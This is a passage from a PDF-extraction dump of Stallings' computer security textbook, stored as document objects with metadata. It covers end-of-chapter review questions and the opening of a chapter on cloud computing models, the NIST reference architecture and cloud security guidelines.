interface cards attached to the system is \\nnot enough?\\n 12.9 Some have ar gued that Unix/Linux systems reuse a small number of security fea -\\ntures in many contexts across the system, while Windows systems provide a much \\nlarger number of more specifically targeted security features used in the appropriate \\ncontexts. This may be seen as a trade-off between simplicity and lack of flexibility in \\nthe Unix/Linux approach, against a better targeted but more complex and harder to \\ncorrectly configure approach in Windows. Discuss this trade-off as it impacts on the \\nsecurity of these respective systems, and the load placed on administrators in manag-\\ning their security.\\n 12.10 It is recommended that while using a hypervisor, the access to the hypervisor should \\nbe limited to authorized administrators only. Why?\\nM12_STAL0611_04_GE_C12.indd   444 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 446, 'page_label': '445'}, page_content='445\\n13.1 Cloud Computing\\nCloud Computing Elements\\nCloud Service Models\\nCloud Deployment Models\\nCloud Computing Reference Architecture\\n13.2 Cloud Security Concepts\\nSecurity Issues for Cloud Computing\\nAddressing Cloud Computing Security Concerns\\n13.3 Cloud Security Approaches\\nRisks and Countermeasures\\nData Protection in the Cloud\\nSecurity Approaches for Cloud Computing Assets\\nCloud Security as a Service\\nAn Open-source Cloud Security Module\\n13.4 The Internet of Things\\nThings on the Internet of Things\\nEvolution\\nComponents of IoT-enabled Things\\nIoT and Cloud Context\\n13.5 IOT Security \\nThe Patching Vulnerability\\nIoT Security and Privacy Requirements Defined by ITU-T\\nAn IoT Security Framework\\nAn Open-source IoT Security Module\\n13.6 Key Terms and Review Questions\\nCloud and IoT Security\\nCHAPTER \\n \\nM13_STAL0611_04_GE_C13.indd   445 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 447, 'page_label': '446'}, page_content='446  CHAPTER 13 / CLOUD AND IoT SECURITY\\nThe two most significant developments in computing in recent years are cloud computing \\nand the Internet of Things (IoT). In both cases, security measures tailored to the specific \\nrequirements of these environments are evolving. This chapter begins with an overview \\nof the concepts of cloud computing, followed by a discussion of cloud security. Then the \\nchapter examines the concepts of IoT and closes with a discussion of IoT security.\\nFor further detail on the material on cloud computing and IoT in Sections 13.1 \\nand 13.4, see [STAL16a].\\n 13.1 CLOUD COMPUTING\\nThere is an increasingly prominent trend in many organizations to move a substantial \\nportion or even all information technology (IT) operations to an Internet-connected \\ninfrastructure known as enterprise cloud computing. The use of cloud computing raises \\na number of security issues, particularly in the area of database security. This section pro-\\nvides an overview of cloud computing. Section 13.2 discussed cloud computing security.\\nCloud Computing Elements\\nNIST defines cloud computing, in NIST SP 800-145 (The NIST Definition of Cloud \\nComputing, September 2011) as follows:\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Present an overview of cloud computing concepts.\\n ◆ List and define the principal cloud services.\\n ◆ List and define the cloud deployment models.\\n ◆ Explain the NIST cloud computing reference architecture.\\n ◆ Describe Cloud Security as a Service.\\n ◆ Understand the OpenStack security module for cloud security.\\n ◆ Explain the scope of the Internet of things.\\n ◆ List and discuss the five principal components of IoT-enabled things.\\n ◆ Understand the relationship between cloud computing and IoT.\\n ◆ Define the patching vulnerability.\\n ◆ Explain the IoT Security Framework.\\n ◆ Understand the MiniSec security feature for wireless sensor networks.\\nCloud computing: A model for enabling ubiquitous, convenient, on-demand net-\\nwork access to a shared pool of configurable computing resources (e.g., networks, \\nservers, storage, applications, and services) that can be rapidly provisioned and \\nreleased with minimal management effort or service provider interaction. This \\ncloud model promotes availability and is composed of five essential characteristics, \\nthree service models, and four deployment models.\\nM13_STAL0611_04_GE_C13.indd   446 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 448, 'page_label': '447'}, page_content='13.1 / CLOUD COMPUTING  447\\nThe definition refers to various models and characteristics, whose relationship \\nis illustrated in Figure 13.1. The essential characteristics of cloud computing includes \\nthe following:\\n• Broad network access: Capabilities are available over the network and accessed \\nthrough standard mechanisms that promote use by heterogeneous thin or thick \\nclient platforms (e.g., mobile phones, laptops, and tablets) as well as other tra-\\nditional or cloud-based software services.\\n• Rapid elasticity: Cloud computing gives you the ability to expand and reduce \\nresources according to your specific service requirement. For example, you may \\nneed a large number of server resources for the duration of a specific task. You \\ncan then release these resources upon completion of the task.\\n• Measured service: Cloud systems automatically control and optimize resource \\nuse by leveraging a metering capability at some level of abstraction appropri -\\nate to the type of service (e.g., storage, processing, bandwidth, and active user \\naccounts). Resource usage can be monitored, controlled, and reported, provid-\\ning transparency for both the provider and consumer of the utilized service.\\n• On-demand self-service:  A cloud service consumer (CSC) can unilaterally \\nprovision computing capabilities, such as server time and network storage, as \\nneeded, automatically, without requiring human interaction with each service \\nFigure 13.1 Cloud Computing Elements\\nBroad\\nNetwork Access\\nResource Pooling\\nRapid\\nElasticity\\nEssential\\nCharacteristics\\nService\\nModels\\nDeployment\\nModels\\nMeasured\\nService\\nOn-demand\\nSelf-service\\nPublic Private Hybrid Community\\nSoftware as a Service (SaaS)\\nPlatform as a Service (PaaS)\\nInfrastructure as a Service (IaaS)\\nM13_STAL0611_04_GE_C13.indd   447 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 449, 'page_label': '448'}, page_content='448  CHAPTER 13 / CLOUD AND IoT SECURITY\\nprovider. Because the service is on demand, the resources are not permanent \\nparts of the consumer’s IT infrastructure.\\n• Resource pooling:  The provider’s computing resources are pooled to serve \\nmultiple CSCs using a multi-tenant model, with different physical and virtual \\nresources dynamically assigned and reassigned according to consumer demand. \\nThere is a degree of location independence in that the CSC generally has no \\ncontrol or knowledge of the exact location of the provided resources, but may \\nbe able to specify location at a higher level of abstraction (e.g., country, state, \\nor data center). Examples of resources include storage, processing, memory, \\nnetwork bandwidth, and virtual machines (VMs). Even private clouds tend to \\npool resources between different parts of the same organization.\\nCloud Service Models\\nNIST SP 800-145 defines three service models, which can be viewed as nested service \\nalternatives: Software as a service (SaaS), platform as a service (PaaS), and infrastruc-\\nture as a service (IaaS).\\nSoftware aS a Service SaaS provides service to customers in the form of soft -\\nware, specifically application software, running on and accessible in the cloud. SaaS \\nfollows the familiar model of Web services, in this case applied to cloud resources. \\nSaaS enables the customer to use the cloud provider’s applications running on the \\nprovider’s cloud infrastructure. The applications are accessible from various client \\ndevices through a simple interface such as a Web browser. Instead of obtaining desk-\\ntop and server licenses for software products it uses, an enterprise obtains the same \\nfunctions from the cloud service. The use of SaaS avoids the complexity of software \\ninstallation, maintenance, upgrades, and patches. Examples of services at this level \\nare Google Gmail, Microsoft 365, Salesforce, Citrix GoToMeeting, and Cisco WebEx.\\nCommon subscribers to SaaS are organizations that want to provide their \\nemployees with access to typical office productivity software, such as document \\nmanagement and e-mail. Individuals also commonly use the SaaS model to acquire \\ncloud resources. Typically, subscribers use specific applications on demand. The cloud \\nprovider also usually offers data-related features such as automatic backup and data \\nsharing between subscribers.\\nPlatform aS a Service A PaaS cloud provides service to customers in the form of \\na platform on which the customer’s applications can run. PaaS enables the customer \\nto deploy onto the cloud infrastructure customer-created or -acquired applications. \\nA\\xa0PaaS cloud provides useful software building blocks, plus a number of development \\ntools, such as programming language tools, run-time environments, and other tools \\nthat assist in deploying new applications. In effect, PaaS is an operating system in the \\ncloud. PaaS is useful for an organization that wants to develop new or tailored applica-\\ntions while paying for the needed computing resources only as needed and only for as \\nlong as needed. AppEngine, Engine Yard, Heroku, Microsoft Azure, Force.com, and \\nApache Stratos are examples of PaaS.\\ninfraStructure aS a Service With IaaS, the customer has access to the resources \\nof the under lying cloud infrastructure. The cloud service user does not manage or \\ncontrol the resources of the underlying cloud infrastructure but has control over \\nM13_STAL0611_04_GE_C13.indd   448 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 450, 'page_label': '449'}, page_content='13.1 / CLOUD COMPUTING  449\\noperating systems, deployed applications, and possibly limited control of select \\n networking components (e.g., host firewalls). IaaS provides VMs and other virtual-\\nized hardware and operating systems. IaaS offers the customer processing, storage, \\nnetworks, and other fundamental computing resources so that the customer is able to \\ndeploy and run arbitrary software, which can include operating systems and applica-\\ntions. IaaS enables customers to combine basic computing services, such as number \\ncrunching and data storage, to build highly adaptable computer systems.\\nTypically, customers are able to self-provision this infrastructure, using a Web-\\nbased graphical user interface that serves as an IT operations management console \\nfor the overall environment. API access to the infrastructure may also be offered \\nas an option. Examples of IaaS are Amazon Elastic Compute Cloud (Amazon \\nEC2), Microsoft Windows Azure, Google Compute Engine (GCE), and Rackspace. \\n Figure\\xa013.2 compares the functions implemented by the cloud service provider for \\nthe three service models.\\nCloud Deployment Models\\nThere is an increasingly prominent trend in many organizations to move a substantial \\nportion or even all IT operations to enterprise cloud computing. The organization is \\nfaced with a range of choices as to cloud ownership and management. In this subsec-\\ntion, we look at the four most prominent deployment models for cloud computing.\\nPublic cloud A public cloud infrastructure is made available to the general pub-\\nlic or a large industry group and is owned by an organization selling cloud services. \\nFigure 13.2 Separation of Responsibilities in Cloud Service Models\\nManaged by customer\\nNetworking\\nStorage\\nServers\\nVirtualization\\nOS\\nMiddleware\\nRuntime\\nData\\nApplications\\nTraditional\\nIT-on\\npremises\\nNetworking\\nStorage\\nServers\\nVirtualization\\nOS\\nMiddleware\\nRuntime\\nData\\nApplications\\nIaaS\\nNetworking\\nStorage\\nServers\\nVirtualization\\nOS\\nMiddleware\\nRuntime\\nData\\nApplications\\nPaaS\\nNetworking\\nStorage\\nServers\\nVirtualization\\nOS\\nMiddleware\\nRuntime\\nData\\nApplications\\nSaaS\\nManaged by cloud service provider\\nM13_STAL0611_04_GE_C13.indd   449 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 451, 'page_label': '450'}, page_content='450  CHAPTER 13 / CLOUD AND IoT SECURITY\\nThe\\xa0cloud provider is responsible both for the cloud infrastructure and for the control \\nof data and operations within the cloud. A public cloud may be owned, managed, and \\noperated by a business, academic, government organization, or some combination of \\nthem. It exists on the premises of the cloud service provider.\\nIn a public cloud model, all major components are outside the enterprise fire-\\nwall, located in a multitenant infrastructure. Applications and storage are made avail-\\nable over the Internet via secure IP , and can be free or offered at a pay-per-usage \\nfee. This type of cloud supplies easy-to-use consumer-type services, such as Amazon \\nand Google on-demand Web applications or capacity, Yahoo mail, and Facebook or \\n LinkedIn social media providing free storage for photographs. While public clouds \\nare inexpensive and scale to meet needs, they typically provide no or lower SLAs, \\nand may not offer the guarantees against data loss or corruption found with private \\nor hybrid cloud offerings. The public cloud is appropriate for CSCs and entities not \\nrequiring the same levels of service that are expected within the firewall. In addition, \\nthe public IaaS clouds do not necessarily provide for restrictions and compliance with \\nprivacy laws, which remain the responsibility of the subscriber or corporate end user. \\nIn many public clouds, the focus is on the CSC and small and medium-sized businesses \\nwhere pay-per-use pricing is available, often equating to pennies per gigabyte. Exam-\\nples of services here might be photo and music sharing, laptop backup or file sharing.\\nThe major advantage of the public cloud is cost. A subscribing organization only \\npays for the services and resources it needs and can adjust these as needed. Further, \\nthe subscriber has greatly reduced management overhead. The principal concern is \\nsecurity. However, there are a number of public cloud providers that have demon -\\nstrated strong security controls and, in fact, such providers may have more resources \\nand expertise to devote to security that would be available in a private cloud.\\nPrivate cloud A private cloud is implemented within the internal IT environ -\\nment of the organization. The organization may choose to manage the cloud in house, \\nor contract the management function to a third party. Additionally, the cloud servers \\nand storage devices may exist on premise, off premise or both.\\nPrivate clouds can deliver IaaS internally to employees or business units through \\nan intranet or the Internet via a virtual private network (VPN), as well as software \\n(applications) or storage as services to its branch offices. In both cases, private clouds \\nare a way to leverage existing infrastructure, and deliver and chargeback for bundled \\nor complete services from the privacy of the organization’s network. Examples of \\nservices delivered through the private cloud include database on demand, e-mail on \\ndemand, and storage on demand.\\nA key motivation for opting for a private cloud is security. A private cloud \\ninfrastructure offers tighter controls over the geographic location of data storage \\nand other aspects of security. Other benefits include easy resource sharing and rapid \\ndeployment to organizational entities.\\ncommunity cloud A community cloud shares the char acteristics of private and \\npublic clouds. Like a private cloud, a community cloud has restricted access. Like a \\npublic cloud, the cloud resources are shared among a number of independent organi-\\nzations. The organizations that share the community cloud have similar requirements \\nand, typically, a need to exchange data with each other. One example of an industry that \\nis employing the community cloud concept is the health care industry. A\\xa0community \\nM13_STAL0611_04_GE_C13.indd   450 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 452, 'page_label': '451'}, page_content='13.1 / CLOUD COMPUTING  451\\ncloud can be implemented to comply with government privacy and other regulations. \\nThe community participants can exchange data in a controlled fashion.\\nThe cloud infrastructure may be managed by the participating organizations \\nor a third party and may exist on premise or off premise. In this deployment model, \\nthe costs are spread over fewer users than a public cloud (but more than a private \\ncloud), so only some of the cost savings potential of cloud computing are realized.\\nHybrid cloud The hybrid cloud infrastructure is a composition of two or more \\nclouds (priv ate, community, or public) that remain unique entities but are bound \\ntogether by standardized or proprietary technology that enables data and application \\nportability (e.g., cloud bursting for load balancing between clouds). With a hybrid \\ncloud solution, sensitive information can be placed in a private area of the cloud, and \\nless sensitive data can take advantage of the benefits of the public cloud.\\nA hybrid public/private cloud solution can be particularly attractive for smaller \\nbusinesses. Many applications for which security concerns are less can be offloaded \\nat considerable cost savings without committing the organization to moving more \\nsensitive data and applications to the public cloud. Table 13.1 lists some of the relative \\nstrengths and weaknesses of the four cloud deployment models.\\nCloud Computing Reference Architecture\\nNIST SP 500–292 (NIST Cloud Computing Reference Architecture, September 2011) \\nestablishes reference architecture, described as follows:\\nPrivate Community Public Hybrid\\nScalability Limited Limited Very high Very high\\nSecurity Most secure option Very secure Moderately secure Very secure\\nPerformance Very good Very good Low to medium Good\\nReliability Very high Very high Medium Medium to high\\nCost High Medium Low Medium\\nTable 13.1 Comparison of Cloud Deployment Models\\n The NIST cloud computing reference architecture focuses on the requirements \\nof “what” cloud services provide, not a “how to” design solution and implemen-\\ntation. The reference architecture is intended to facilitate the understanding of \\nthe operational intricacies in cloud computing. It does not represent the system \\narchitecture of a specific cloud computing system; instead it is a tool for  describing, \\ndiscussing, and developing a system-specific architecture using a common frame-\\nwork of reference.\\nNIST developed the reference architecture with the following objectives \\nin\\xa0mind:\\n• To illustrate and understand the various cloud services in the context of an \\noverall cloud computing conceptual model.\\nM13_STAL0611_04_GE_C13.indd   451 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 453, 'page_label': '452'}, page_content='452  CHAPTER 13 / CLOUD AND IoT SECURITY\\n• To provide a technical reference for CSCs to understand, discuss, categorize, \\nand compare cloud services.\\n• To facilitate the analysis of candidate standar ds for security, interoperability, \\nand portability and reference implementations.\\nThe reference architecture, depicted in Figure 13.3, defines five major actors in \\nterms of the roles and responsibilities:\\n• Cloud service consumer (CSC):  A person or organization that maintains a \\n business relationship with, and uses service from, cloud providers.\\n• Cloud service provider (CSP): A person, organization, or entity responsible for \\nmaking a service available to interested parties.\\n• Cloud auditor: A party that can conduct independent assessment of cloud ser-\\nvices, information system operations, performance, and security of the cloud \\nimplementation.\\n• Cloud broker: An entity that manages the use, performance and delivery of \\ncloud services, and negotiates relationships between CSPs and cloud consumers.\\n• Cloud carrier : An intermediary that provides connectivity and transport of \\ncloud services from CSPs to cloud consumers.\\nThe roles of the cloud consumer and provider have already been discussed. To \\nsummarize, a cloud service provider can provide one or more of the cloud services \\nto meet IT and business requirements of cloud service consumers. For each of the \\nthree service models (SaaS, PaaS, and IaaS), the CSP provides the storage and pro-\\ncessing facilities needed to support that service model, together with a cloud interface \\nfor cloud service consumers. For SaaS, the CSP deploys, configures, maintains, and \\nupdates the operation of the software applications on a cloud infrastructure so that \\nFigure 13.3 NIST Cloud Computing Reference Architecture\\nCloud\\nConsumer\\nCloud\\nAuditor\\nService\\nIntermediation\\nService\\nAggregation\\nService\\nArbitrage\\nCloud\\nBroker\\nCloud Provider \\nSecurity\\nAudit\\nPerformance\\nAudit\\nPrivacy\\nImpact Audit\\nSaaS\\nService Layer\\nService Orchestration Cloud\\nService\\nManagement\\nPaaS\\nHardware\\nPhysical Resource Layer\\nFacility\\nResource Abstraction\\nand Control Layer\\nIaaS\\nBusiness\\nSupport\\nProvisioning/\\nConﬁguration\\nPortability/\\nInteroperability\\nSecurity\\nPrivacy\\nCloud Carrier\\nM13_STAL0611_04_GE_C13.indd   452 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 454, 'page_label': '453'}, page_content='13.1 / CLOUD COMPUTING  453\\nthe services are provisioned at the expected service levels to cloud consumers. The \\nconsumers of SaaS can be organizations that provide their members with access to \\nsoftware applications, end users who directly use software applications, or software \\napplication administrators who configure applications for end users.\\nFor PaaS, the CSP manages the computing infrastructure for the platform \\nand runs the cloud software that provides the components of the platform, such as \\nruntime software execution stack, databases, and other middleware components. \\nCloud consumers of PaaS can employ the tools and execution resources provided \\nby CSPs to develop, test, deploy, and manage the applications hosted in a cloud \\nenvironment.\\nFor IaaS, the CSP acquires the physical computing resources underlying the \\nservice, including the servers, networks, storage, and hosting infrastructure. The IaaS \\nCSC in turn uses these computing resources, such as a virtual computer, for their \\nfundamental computing needs.\\nThe cloud carrier is a networking facility that provides connectivity and trans-\\nport of cloud services between cloud consumers and CSPs. Typically, a CSP will set \\nup service level agreements (SLAs) with a cloud carrier to provide services consistent \\nwith the level of SLAs offered to cloud consumers, and may require the cloud carrier \\nto provide dedicated and secure connections between cloud consumers and CSPs.\\nA cloud broker  is useful when cloud services are too complex for a cloud \\n consumer to easily manage. A cloud broker can offer three areas of support are as \\nfollows:\\n• Service intermediation:  These are value-added services, such as identity \\n management, performance reporting, and enhanced security.\\n• Service aggregation: The broker combines multiple cloud services to meet con-\\nsumer needs not specifically addressed by a single CSP , or to optimize perfor-\\nmance or minimize cost.\\n• Service arbitrage: This is similar to service aggregation except that the services \\nbeing aggregated are not fixed. Service arbitrage means a broker has the flexibil-\\nity to choose services from multiple agencies. The cloud broker, for example, can \\nuse a credit-scoring service to measure and select an agency with the best\\xa0score.\\nA cloud auditor can evaluate the services provided by a CSP in terms of security \\ncontrols, privacy impact, performance, and so on. The auditor is an independent entity \\nthat can assure that the CSP conforms to a set of standards.\\nFigure 13.4 illustrates the interactions between the actors. A cloud consumer \\nmay request cloud services from a cloud provider directly or via a cloud broker. \\nA\\xa0cloud auditor conducts independent audits and may contact the others to collect \\nnecessary information. This figure shows that cloud networking issues involve three \\nseparate types of networks. For a cloud producer, the network architecture is that of \\na typical large data center, which consists of racks of high-performance servers and \\nstorage devices, interconnected with high-speed top-of-rack Ethernet switches. The \\nconcerns in this context focus on VM placement and movement, load balancing, and \\navailability issues. The enterprise network is likely to have a quite different architec-\\nture, typically including a number of LANs, servers, workstations, PCs, and mobile \\ndevices, with a broad range of network performance, security, and management issues. \\nM13_STAL0611_04_GE_C13.indd   453 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 455, 'page_label': '454'}, page_content='454  CHAPTER 13 / CLOUD AND IoT SECURITY\\nThe concern of both producer and consumer with respect to the cloud carrier, which \\nis shared with many users, is the ability to create virtual networks with appropriate \\nSLA and security guarantees.\\n 13.2 CLOUD SECURITY CONCEPTS\\nThere are numerous aspects to cloud security and numerous approaches to providing \\ncloud security measures. A good example of the scope of cloud security concerns and \\nissues is seen in the NIST guidelines for cloud security, specified in NIST SP 800-144 \\n(Guidelines on Security and Privacy in Public Cloud Computing , December 2011) \\nand listed in Table 13.2. Thus, a full discussion of cloud security is well beyond the \\nscope of this chapter.\\nSecurity Issues for Cloud Computing\\nSecurity is important to any computing infrastructure. Companies go to great lengths \\nto secure on-premises computing systems, so it is not surprising that security looms as \\na major consideration when augmenting or replacing on-premises systems with cloud \\nservices. Allaying security concerns is frequently a prerequisite for further discussions \\nabout migrating part or all of an organization’s computing architecture to the cloud. \\nAvailability is another major concern.\\nGenerally speaking, such questions only arise when businesses contemplat -\\ning moving core transaction processing, such as enterprise resource planning (ERP) \\n systems, and other mission critical applications to the cloud. Companies have tradi -\\ntionally demonstrated less concern about migrating high maintenance applications \\nsuch as e-mail and payroll to cloud service providers, even though such applications \\nhold sensitive information.\\nFigure 13.4 Interactions between Actors in Cloud Computing\\nCloud Consumer\\nCloud Broker\\nCloud Auditor\\nCloud Producer\\nEnterprise\\nNetwork\\nCloud\\nCarrier\\nData Center\\nNetwork\\nM13_STAL0611_04_GE_C13.indd   454 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 456, 'page_label': '455'}, page_content='13.2 / CLOUD SECURITY CONCEPTS  455\\nGovernance\\nExtend organizational practices pertaining to the policies, procedures, and standards used for application \\ndevelopment and service provisioning in the cloud, as well as the design, implementation, testing, use, and \\nmonitoring of deployed or engaged services.\\nPut in place audit mechanisms and tools to ensure organizational practices are followed throughout the system \\nlifecycle.\\nCompliance\\nUnderstand the various types of laws and regulations that impose security and privacy obligations on the \\n organization and potentially impact cloud computing initiatives, particularly those involving data location, \\n privacy and security controls, records management, and electronic discovery requirements.\\nReview and assess the cloud provider’s offerings with respect to the organizational requirements to be met and \\nensure that the contract terms adequately meet the requirements.\\nEnsure that the cloud provider’s electronic discovery capabilities and processes do not compromise the privacy \\nor security of data and applications.\\nTrust\\nEnsure that service arrangements have sufficient means to allow visibility into the security and privacy \\n controls and processes employed by the cloud provider, and their performance over time.\\nEstablish clear, exclusive ownership rights over data.\\nInstitute a risk management program that is flexible enough to adapt to the constantly evolving and shifting \\nrisk landscape for the lifecycle of the system.\\nContinuously monitor the security state of the information system to support ongoing risk management \\ndecisions.\\nArchitecture\\nUnderstand the underlying technologies that the cloud provider uses to provision services, including the impli-\\ncations that the technical controls involved have on the security and privacy of the system, over the full system \\nlifecycle and across all system components.\\nIdentity and access management\\nEnsure that adequate safeguards are in place to secure authentication, authorization, and other identity and \\naccess management functions, and are suitable for the organization.\\nSoftware isolation\\nUnderstand virtualization and other logical isolation techniques that the cloud provider employs in its \\n multi-tenant software architecture, and assess the risks involved for the organization.\\nData protection\\nEvaluate the suitability of the cloud provider’s data management solutions for the organizational data \\n concerned and the ability to control access to data; to secure data while at rest, in transit, and in use; and to \\nsanitize data.\\nTake into consideration the risk of collating organizational data with those of other organizations whose threat \\nprofiles are high or whose data collectively represent significant concentrated value.\\nFully understand and weigh the risks involved in cryptographic key management with the facilities available in \\nthe cloud environment and the processes established by the cloud provider.\\nAvailability\\nUnderstand the contract provisions and procedures for availability, data backup and recovery, and disaster \\nrecovery, and ensure that they meet the organization’s continuity and contingency planning requirements.\\nEnsure that during an intermediate or prolonged disruption or a serious disaster, critical operations can be \\nimmediately resumed, and that all operations can be eventually reinstituted in a timely and organized manner.\\nTable 13.2 NIST Guidelines on Cloud Security and Privacy Issues and Recommendations\\n(Continued)\\nM13_STAL0611_04_GE_C13.indd   455 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 457, 'page_label': '456'}, page_content='456  CHAPTER 13 / CLOUD AND IoT SECURITY\\nIncident response\\nUnderstand the contract provisions and procedures for incident response and ensure that they meet the \\nrequirements of the organization.\\nEnsure that the cloud provider has a transparent response process in place and sufficient mechanisms to share \\ninformation during and after an incident.\\nEnsure that the organization can respond to incidents in a coordinated fashion with the cloud provider in \\naccordance with their respective roles and responsibilities for the computing environment.\\nTable 13.2 (Continued)\\nAuditability is another concern for many organizations. For example, in the U.S., \\nmany organizations must comply with Sarbanes-Oxley and/or Health and Human \\nServices Health Insurance Portability and Accountability Act (HIPAA) regulations. \\nThe auditability of their data must be ensured whether it is stored on premises or \\nmoved to the cloud.\\nBefore moving critical infrastructure to the cloud, businesses should perform due \\ndiligence on security threats both from outside and inside the cloud. Many of the security \\nissues associated with protecting clouds from outside threats are similar to those that \\nhave traditionally faced centralized data centers. In the cloud, however, responsibility for \\nassuring adequate security is frequently shared among users, vendors, and any third-party \\nfirms that users rely on for security-sensitive software or configurations. Cloud users are \\nresponsible for application-level security. Cloud vendors are responsible for physical \\nsecurity and some software security such as enforcing external firewall policies. Security \\nfor intermediate layers of the software stack is shared between users and vendors.\\nA security risk that should not be overlooked by companies considering a \\nmigration to the cloud is that posed by sharing vendor resources with other cloud \\nusers. Cloud providers must guard against theft or denial-of-service attacks by their \\nusers and users need to be protected from one another. Virtualization can be a pow-\\nerful mechanism for addressing these potential risks because it protects against most \\nattempts by users to attack one another or the provider’s infrastructure. However, \\nnot all resources are virtualized, and not all virtualization environments are bug free. \\nIncorrect virtualization may allow user code to access to sensitive portions of the pro-\\nvider’s infrastructure or the resources of other users. Once again, these security issues \\nare not unique to the cloud and are similar to those involved in managing non-cloud \\ndata centers, where different applications need to be protected from one another.\\nAnother security concern that businesses should consider is the extent to which \\nsubscribers are protected against the provider, especially in the area of inadvertent data \\nloss. For example, in the event of provider infrastructure improvements, what happens to \\nhardware that is retired or replaced? It is easy to imagine a hard disk being disposed of \\nwithout being properly wiped clean of subscriber data. It is also easy to imagine permis-\\nsions bugs or errors that make subscriber data visible to unauthorized users. User-level 